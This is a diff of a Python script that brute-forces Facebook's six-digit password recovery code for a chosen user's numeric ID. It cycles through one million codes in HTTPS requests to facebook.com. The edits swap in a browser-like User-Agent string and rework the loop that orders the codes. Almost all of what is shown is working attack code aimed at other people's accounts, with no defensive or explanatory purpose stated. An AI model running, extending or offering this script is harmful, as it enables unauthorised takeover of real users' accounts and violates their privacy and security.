@@ -8,7 +8,7 @@ print "you have to trigger the password recovery at https://www.facebook.com/log
 connection = httplib.HTTPSConnection("www.facebook.com", 443)
 user = raw_input("Enter user numerical ID: ")
 
-headers={"Host":"www.facebook.com", "User-Agent":"oct. 03, 2019, 08:48:12", "Accept-Language": "en-US, en"}
+headers={"Host":"www.facebook.com", "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0", "Accept-Language": "en-US, en"}
 
 code = ['0', '0', '0', '0', '0', '0']
 index = [0, 0, 0, 0, 0, 0]
@@ -16,7 +16,7 @@ rain = 0
 count = 0
 cs = "0123456789"
 
-print "One million recovery code to test, be patient"
+print "One million recovery code to test"
 for index[0] in range(10):
         for index[1] in range(10):
                 for index[2] in range(10):
@@ -27,9 +27,7 @@ for index[0] in range(10):
                                                 for x in range(6):                        #
                                                         code[x] = cs[(index[x]+rain)%10]  #
                                                         rain += x+1                       #
-                                                for x in range(1, 7):                     #
-                                                        rain -= x                         #
-                                                rain -= (1+2+3+4+5+6)-4                   #
+                                                rain -= (1+2+3+4+5+6)-2                   #
                                                 ###########################################
                                                 query = urllib.urlencode({"u":"%s" % user, "n":"%c%c%c%c%c%c" % (code[0], code[1], code[2], code[3], code[4], code[5])})
                                                 if count % 1000 == 0:
